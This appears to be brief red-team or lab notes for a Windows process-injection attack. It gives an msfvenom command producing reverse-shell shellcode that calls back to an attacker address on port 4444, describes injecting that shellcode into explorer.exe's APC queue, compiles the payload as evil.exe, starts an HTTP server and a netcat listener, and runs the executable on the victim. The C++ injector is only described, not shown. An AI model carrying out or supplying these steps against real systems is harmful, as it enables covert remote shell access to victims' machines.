# Attacker server
- Create malicious shellcode by msfvenom
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.138 LPORT=4444 -f c
```
- Create a C++ file that find explorer.exe to inject shellcode into it APC Queue
- Compile exe file from C++ file:
```bash
x86_64-w64-mingw32-g++ -o evil.exe evil.cpp -static-libgcc -static-libstdc++
```
- Run listening server
```bash
python -m http.server 80
nc -nvlp 4444
```

# Victime machine
```bash
.\evil.exe PID
```